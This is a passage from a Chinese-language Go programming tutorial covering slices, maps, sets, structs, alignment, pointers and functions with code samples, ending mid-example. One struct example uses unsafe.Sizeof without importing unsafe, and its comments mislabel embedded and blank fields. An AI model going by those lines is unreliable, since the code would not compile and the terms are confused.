<li><code>a[low:high]</code>：截取下标从 low 到 high-1 的元素，返回一个新的切片<ul>
<li>如果 low 或 high 被省略，则默认为 0 或切片的长度</li>
<li><code>a[:]</code> 返回一个包含所有切片元素的新切片</li>
</ul>
</li>
</ul>
</li>
<li>完全的（Full）<ul>
<li><code>a[low:high:max]</code>：其中 low 和 high 的含义与 Simple 相同，max 表示新切片的容量上限<ul>
<li>如果 max 被省略，则默认为切片的容量</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    fmt.Println(a, <span class="built_in">len</span>(a), <span class="built_in">cap</span>(a)) <span class="comment">// [0 1 2 3 4 5] 6 6</span></span><br><span class="line"></span><br><span class="line">    b := a[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    fmt.Println(b, <span class="built_in">len</span>(b), <span class="built_in">cap</span>(b)) <span class="comment">// [2 3] 2 4</span></span><br><span class="line"></span><br><span class="line">    c := a[<span class="number">3</span>:]</span><br><span class="line">    fmt.Println(c, <span class="built_in">len</span>(c), <span class="built_in">cap</span>(c)) <span class="comment">// [3 4 5] 3 3</span></span><br><span class="line"></span><br><span class="line">    d := a[:<span class="number">3</span>]</span><br><span class="line">    fmt.Println(d, <span class="built_in">len</span>(d), <span class="built_in">cap</span>(d)) <span class="comment">// [0 1 2] 3 6</span></span><br><span class="line"></span><br><span class="line">    e := a[:]</span><br><span class="line">    fmt.Println(e, <span class="built_in">len</span>(e), <span class="built_in">cap</span>(e)) <span class="comment">// [0 1 2 3 4 5] 6 6</span></span><br><span class="line"></span><br><span class="line">    f := a[<span class="number">2</span>:<span class="number">4</span>:<span class="number">4</span>]</span><br><span class="line">    fmt.Println(f, <span class="built_in">len</span>(f), <span class="built_in">cap</span>(f)) <span class="comment">// [2 3] 2 2</span></span><br><span class="line"></span><br><span class="line">    g := a[<span class="number">2</span>:<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">    fmt.Println(g, <span class="built_in">len</span>(g), <span class="built_in">cap</span>(g)) <span class="comment">// [2 3] 2 4</span></span><br><span class="line"></span><br><span class="line">    h := <span class="built_in">append</span>(a[:<span class="number">2</span>], a[<span class="number">4</span>:]...)</span><br><span class="line">    fmt.Println(h, <span class="built_in">len</span>(h), <span class="built_in">cap</span>(h)) <span class="comment">// [0 1 4 5] 4 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><ul>
<li>映射（map）像 slice 一样，也有底层数据结构<ul>
<li>map 的赋值并不会拷贝底层数据结构，它们都指向同一段内存</li>
</ul>
</li>
<li>映射（map）是无序的，key 必须支持比较操作（<code>==</code>和<code>!=</code>）<ul>
<li>key 不能是 function、map 和 slice 类型</li>
<li>key 是 interface 时，其运行时的动态类型必须支持比较操作（否则会出现执行错误）</li>
<li>访问 key 不存在的元素将返回 zero 值</li>
<li>映射的初始大小不会限制其容量，其容量会增长以容纳更多元素</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-type-map"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-map-1">Basic</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-map-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> timeZone = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line">    <span class="string">&quot;UTC&quot;</span>:  <span class="number">0</span>*<span class="number">60</span>*<span class="number">60</span>,</span><br><span class="line">    <span class="string">&quot;EST&quot;</span>: <span class="number">-5</span>*<span class="number">60</span>*<span class="number">60</span>,</span><br><span class="line">    <span class="string">&quot;CST&quot;</span>: <span class="number">-6</span>*<span class="number">60</span>*<span class="number">60</span>,</span><br><span class="line">    <span class="string">&quot;MST&quot;</span>: <span class="number">-7</span>*<span class="number">60</span>*<span class="number">60</span>,</span><br><span class="line">    <span class="string">&quot;PST&quot;</span>: <span class="number">-8</span>*<span class="number">60</span>*<span class="number">60</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// declare</span></span><br><span class="line">    <span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// init</span></span><br><span class="line">    m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add &amp; modify</span></span><br><span class="line">    m[<span class="string">&quot;a&quot;</span>] = <span class="number">1</span></span><br><span class="line">    m[<span class="string">&quot;b&quot;</span>] = <span class="number">2</span></span><br><span class="line">    m[<span class="string">&quot;c&quot;</span>] = <span class="number">3</span></span><br><span class="line">    fmt.Println(m) <span class="comment">// map[a:1 b:2 c:3]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete</span></span><br><span class="line">    <span class="built_in">delete</span>(m, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    fmt.Println(m) <span class="comment">// map[b:2 c:3]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// query</span></span><br><span class="line">    v := m[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">    fmt.Println(v) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// exist?</span></span><br><span class="line">    v, ok := m[<span class="string">&quot;c&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> ok &#123;</span><br><span class="line">        fmt.Println(v, ok) <span class="comment">// 3 true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// traveral</span></span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">        fmt.Println(k, v) <span class="comment">// c 3  b 2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><ul>
<li>将 map 的值类型定义为<code>struct&#123;&#125;</code>，其值即不占用内存空间</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// empty structures do not take up any memory space</span></span><br><span class="line"><span class="keyword">type</span> Set <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set)</span></span> Add(key <span class="type">string</span>) &#123;</span><br><span class="line">    s[key] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set)</span></span> Contains(key <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">    _, ok := s[key]</span><br><span class="line">    <span class="keyword">return</span> ok</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    set := <span class="built_in">make</span>(Set)</span><br><span class="line">    set.Add(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    set.Add(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(set.Contains(<span class="string">&quot;A&quot;</span>)) <span class="comment">// true</span></span><br><span class="line">    fmt.Println(set.Contains(<span class="string">&quot;C&quot;</span>)) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Struct"><a href="#Struct" class="headerlink" title="Struct"></a>Struct</h3><ul>
<li>结构体（struct）是一系列命名字段（field）的序列<ul>
<li>支持匿名字段（anonymous field）：只有 field 类型，此时 field 的类型也作为名字使用</li>
<li>支持空字段（empty field）：field 的名字为<code>_</code>，用于忽略掉某些不需要的字段以提高性能<ul>
<li>多个空字段之间没有区分，因此无法区分它们</li>
</ul>
</li>
<li>支持嵌入字段（embedded field）：将结构体类型 A 嵌入结构体类型 B 中，从而复用 A 的所有 field</li>
<li>支持对字段添加字面量标签（literal tag）：是编译时的字符串注释，其中包含一些键值对（可用空格或逗号分隔）</li>
</ul>
</li>
<li>空结构体（<code>struct&#123;&#125;</code>）：不占用内存空间，仅作为占位符使用<ul>
<li>将 map 的值类型定义为空结构体，可以将 map 作为 set 使用</li>
<li>定义只包含方法的结构体，只有默认实现</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-struct"><ul class="nav-tabs"><li class="tab active"><a href="#go-struct-1">Basic</a></li><li class="tab"><a href="#go-struct-2">TagForJson</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-struct-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span> &#123;</span><br><span class="line">    x <span class="type">int</span></span><br><span class="line">    y <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AA <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="comment">// (empty field)</span></span><br><span class="line">    <span class="type">string</span> <span class="comment">// (empty field)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> B <span class="keyword">struct</span> &#123;</span><br><span class="line">    z <span class="type">float32</span></span><br><span class="line">    A <span class="comment">// (embedded field)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BB <span class="keyword">struct</span> &#123;</span><br><span class="line">    z  <span class="type">float32</span></span><br><span class="line">    a  A</span><br><span class="line">    _  <span class="type">int</span> <span class="comment">// padding (anonymous field)</span></span><br><span class="line">    aa AA</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(unsafe.Sizeof(<span class="keyword">struct</span>&#123;&#125;&#123;&#125;)) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    a := A&#123;x: <span class="number">1</span>, y: <span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">    fmt.Println(a.x, a.y) <span class="comment">// 1 2</span></span><br><span class="line"></span><br><span class="line">    b := B&#123;A: A&#123;x: <span class="number">1</span>, y: <span class="string">&quot;2&quot;</span>&#125;, z: <span class="number">3.0</span>&#125;</span><br><span class="line">    fmt.Println(b.x, b.y, b.z) <span class="comment">// 1 2 3</span></span><br><span class="line"></span><br><span class="line">    bb := BB&#123;a: A&#123;x: <span class="number">1</span>, y: <span class="string">&quot;2&quot;</span>&#125;, aa: AA&#123;<span class="number">11</span>, <span class="string">&quot;22&quot;</span>&#125;, z: <span class="number">3.0</span>&#125;</span><br><span class="line">    fmt.Println(bb.a.x, bb.a.y, bb.aa.<span class="type">int</span>, bb.aa.<span class="type">string</span>, bb.z) <span class="comment">// 1 2 11 22 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-struct-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">    Age  <span class="type">int</span>    <span class="string">`json:&quot;age&quot;`</span></span><br><span class="line">    City <span class="type">string</span> <span class="string">`json:&quot;city,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    p := Person&#123;Name: <span class="string">&quot;Alice&quot;</span>, Age: <span class="number">30</span>, City: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Person实例序列化为JSON格式</span></span><br><span class="line">    b, err := json.Marshal(p)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出序列化后的JSON字符串</span></span><br><span class="line">    fmt.Println(<span class="type">string</span>(b)) <span class="comment">// &#123;&quot;name&quot;:&quot;Alice&quot;,&quot;age&quot;:30&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="Align"><a href="#Align" class="headerlink" title="Align"></a>Align</h4><ul>
<li>CPU 按字长为单位访问内存，比如 32 位 cpu，字长为 4byte<ul>
<li>按字长访问减少了 CPU 访问内存的次数，从而加大了 CPU 访问内存的吞吐量</li>
</ul>
</li>
<li>结构体对齐原因：<ul>
<li>对于多字节大小的值，比如原本可以存储在一个字长上，由于未对齐内存，可能会占据前后两个字长，从而增加 CPU 访问内存的次数</li>
<li>每次内存访问是原子操作，因此如果变量大小不超过字长，内存对齐后，对该变量的访问就是原子的</li>
</ul>
</li>
<li>GO 对齐规则：<ul>
<li>对于任意类型的变量 x ，unsafe.Alignof(x) 至少为 1</li>
<li>对于 struct 类型的变量 x，计算每一个字段 f 的 unsafe.Alignof(x.f)后，取其中的最大值</li>
<li>对于 array 数组类型的变量 x，unsafe.Alignof(x) 等于构成数组的元素类型的对齐倍数</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空结构体大小为0</span></span><br><span class="line"><span class="keyword">type</span> Empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空结构体作为其他struct最后一个字段时，需要填充额外的内存保证安全</span></span><br><span class="line"><span class="comment">// (因为如果有指针指向该字段, 返回的地址将在结构体之外)</span></span><br><span class="line"><span class="keyword">type</span> S1 <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="type">int32</span></span><br><span class="line">    Empty</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S2 <span class="keyword">struct</span> &#123;</span><br><span class="line">    Empty</span><br><span class="line">    a <span class="type">int32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在x64位机器上，一个 int 占 8 字节</span></span><br><span class="line"><span class="keyword">type</span> S3 <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="type">int</span></span><br><span class="line">    b <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S4 <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="type">int8</span></span><br><span class="line">    b <span class="type">int16</span></span><br><span class="line">    c <span class="type">int32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> S5 <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="type">int8</span></span><br><span class="line">    c <span class="type">int32</span></span><br><span class="line">    b <span class="type">int16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := Empty&#123;&#125;</span><br><span class="line">    s1 := S1&#123;&#125;</span><br><span class="line">    s2 := S2&#123;&#125;</span><br><span class="line">    s3 := S3&#123;&#125;</span><br><span class="line">    s4 := S4&#123;&#125;</span><br><span class="line">    s5 := S5&#123;&#125;</span><br><span class="line">    fmt.Println(unsafe.Alignof(x), unsafe.Sizeof(x))   <span class="comment">// 1 0</span></span><br><span class="line">    fmt.Println(unsafe.Alignof(s1), unsafe.Sizeof(s1)) <span class="comment">// 4 8</span></span><br><span class="line">    fmt.Println(unsafe.Alignof(s2), unsafe.Sizeof(s2)) <span class="comment">// 4 4</span></span><br><span class="line">    fmt.Println(unsafe.Alignof(s3), unsafe.Sizeof(s3)) <span class="comment">// 8 16</span></span><br><span class="line">    fmt.Println(unsafe.Alignof(s4), unsafe.Sizeof(s4)) <span class="comment">// 4 8</span></span><br><span class="line">    fmt.Println(unsafe.Alignof(s5), unsafe.Sizeof(s5)) <span class="comment">// 4 12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Pointer"><a href="#Pointer" class="headerlink" title="Pointer"></a>Pointer</h3><ul>
<li>指针（pointer）用于存储变量的内存地址</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span> &#123;</span><br><span class="line">    x, y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *A)</span></span> setX(x <span class="type">int</span>) &#123;</span><br><span class="line">    p.x = x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">incr</span><span class="params">(p *<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    *p++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createInt</span><span class="params">()</span></span> *<span class="type">int</span> &#123;</span><br><span class="line">    x := <span class="number">123</span></span><br><span class="line">    <span class="keyword">return</span> &amp;x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// point to int</span></span><br><span class="line">    <span class="keyword">var</span> p *<span class="type">int</span></span><br><span class="line">    x := <span class="number">10</span></span><br><span class="line">    p = &amp;x</span><br><span class="line">    fmt.Println(x, *p, p) <span class="comment">// 10 10 0xc00001c150</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// as parameter</span></span><br><span class="line">    incr(p)</span><br><span class="line">    fmt.Println(x, *p, p) <span class="comment">// 11 11 0xc00001c150</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// point to struct</span></span><br><span class="line">    p2 := <span class="built_in">new</span>(A)</span><br><span class="line">    p2.x = <span class="number">1</span></span><br><span class="line">    p2.y = <span class="number">2</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %T\n&quot;</span>, *p2, p2) <span class="comment">// &#123;1 2&#125; *main.A</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// as receiver</span></span><br><span class="line">    p2.setX(<span class="number">11</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %T\n&quot;</span>, *p2, p2) <span class="comment">// &#123;11 2&#125; *main.A</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// as return value</span></span><br><span class="line">    p3 := createInt()</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %T\n&quot;</span>, *p3, p3) <span class="comment">// 123 *int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><ul>
<li>函数（function）是一等公民（first-class citizens），与基本类型支持的场景是等价的</li>
<li>函数支持多个返回值<ul>
<li>函数的命名返回参数可以用作输入参数，当 return 后无参数时，默认返回命名参数的当前值</li>
</ul>
</li>
<li>函数传参：<ul>
<li>按值传递：会拷贝整个对象<ul>
<li>用于只读的占用内存较小的结构体</li>
</ul>
</li>
<li>按指针传递：只会拷贝指针地址，指向的对象是同一个，但会导致内存分配逃逸到堆中，增加GC负担<ul>
<li>用于需要修改原对象值</li>
<li>用于占用内存比较大的结构体</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-function"><ul class="nav-tabs"><li class="tab active"><a href="#go-function-1">Basic</a></li><li class="tab"><a href="#go-function-2">SpecialParam</a></li><li class="tab"><a href="#go-function-3">MultiReturnValue</a></li><li class="tab"><a href="#go-function-4">NamedReturnParameter</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-function-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AddFunc <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makeAdder</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// functional type</span></span><br><span class="line">    <span class="keyword">var</span> f AddFunc = add</span><br><span class="line">    r := f(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    fmt.Println(r) <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// anonymous function</span></span><br><span class="line">    f2 := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;</span><br><span class="line">    r2 := f2(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    fmt.Println(r2) <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// closure</span></span><br><span class="line">    add2 := makeAdder(<span class="number">2</span>)</span><br><span class="line">    add5 := makeAdder(<span class="number">5</span>)</span><br><span class="line">    r3 := add2(<span class="number">3</span>)</span><br><span class="line">    r4 := add5(<span class="number">3</span>)</span><br><span class="line">    fmt.Println(r3, r4) <span class="comment">// 5 8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-function-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="type">int</span>, _ <span class="type">int</span>, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">print</span><span class="params">(prefix <span class="type">string</span>, values ...<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Print(prefix)</span><br><span class="line">    <span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d &quot;</span>, value)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// anonymous variable (ignore)</span></span><br><span class="line">    r := add(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    fmt.Println(r) <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// variadic</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;: &quot;</span>)       <span class="comment">// :</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;: &quot;</span>, <span class="number">1</span>)    <span class="comment">// : 1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;: &quot;</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// : 1 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-function-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;unicode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回多个参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">nextInt</span><span class="params">(b []<span class="type">byte</span>, i <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> ; i &lt; <span class="built_in">len</span>(b) &amp;&amp; !unicode.IsDigit(<span class="type">rune</span>(b[i])); i++ &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ; i &lt; <span class="built_in">len</span>(b) &amp;&amp; unicode.IsDigit(<span class="type">rune</span>(b[i])); i++ &#123;</span><br><span class="line">        x = x*<span class="number">10</span> + <span class="type">int</span>(b[i]) - <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x, i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := []<span class="type">byte</span>&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(b); &#123;</span><br><span class="line">        <span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line">        x, i = nextInt(b, i)</span><br><span class="line">        fmt.Println(x)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-function-4"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// n和err用作输入参数，return返回n和err的当前值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadFull</span><span class="params">(r Reader, buf []<span class="type">byte</span>)</span></span> (n <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(buf) &gt; <span class="number">0</span> &amp;&amp; err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> nr <span class="type">int</span></span><br><span class="line">        nr, err = r.Read(buf)</span><br><span class="line">        n += nr</span><br><span class="line">        buf = buf[nr:]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="不定长参数（variadic）"><a href="#不定长参数（variadic）" class="headerlink" title="不定长参数（variadic）"></a>不定长参数（variadic）</h4><ul>
<li>不定长参数函数（variadic function）可以接受任意数量的参数（用<code>...</code>表示）</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(nums ...<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        sum += num</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(Sum(<span class="number">1</span>, 